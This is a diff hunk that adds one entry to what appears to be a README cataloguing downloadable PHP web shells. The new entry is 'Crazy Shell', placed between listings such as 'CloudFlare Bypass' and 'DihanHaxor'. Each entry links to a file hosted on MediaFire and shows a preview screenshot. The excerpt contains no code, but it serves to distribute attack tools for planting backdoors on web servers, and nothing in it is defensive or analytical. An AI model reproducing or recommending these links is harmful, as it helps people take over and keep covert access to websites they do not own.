@@ -221,6 +221,9 @@ Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-bl
 # <a href="https://www.mediafire.com/file/b2vgn9qgxygdqw8/cloudflare.php/file">CloudFlare Bypass</a>
 <img src="https://i.imgur.com/B2iAGAV.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/82fa7tu8012e7xi/crazy.php/file">Crazy Shell</a>
+<img src="https://i.imgur.com/V21eNLW.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/sqqcs37r9vzjhpn/dihanhaxor_shell.php/file">DihanHaxor</a>
 <img src="https://imgur.com/20Fv1Y0.png" alt="beruangsalju profile">
 
